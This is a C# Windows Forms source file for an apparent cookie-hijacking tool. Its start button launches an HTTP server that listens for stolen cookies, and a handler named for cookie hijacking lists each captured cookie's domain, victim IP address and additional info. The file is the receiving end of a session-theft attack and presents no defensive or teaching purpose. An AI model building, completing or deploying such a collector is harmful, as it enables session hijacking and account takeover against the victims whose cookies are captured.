using System;
using System.Drawing.Text;
using System.Windows.Forms;

namespace SoulRainbow
{
    public partial class Triki : Form
    {
        public Triki()
        {
            InitializeComponent();
            
        }

        private void button_start_Click(object sender, EventArgs e)
        {
            try
            {
                this.HTTPServer = new HTTPServer();
                HTTPServer.CookieRecieved += HTTPServer_cookieRecieved;
                HTTPServer.start();
                this.label_info.Text = "Started listening for cookies on port...";
            }
            catch(Exception ex)
            {
                MessageBox.Show("Something happened please stop other listening server or restart the application, for more" +
                " info: " + ex);        
            }
        }

        private void HTTPServer_cookieRecieved(object sender, CookieHijackingEventArgs eventArgs)
        {
            string ClientIP = eventArgs.ClientIP;
            string Domain = eventArgs.Domain;
            string AdditionalInfo = eventArgs.AdditionalInfo;
            list_cookies.Items.Add("Domain: " + Domain + " ,client IP: " + ClientIP + " ,addtional info: " + AdditionalInfo);
        }

        private HTTPServer HTTPServer;
    }
}
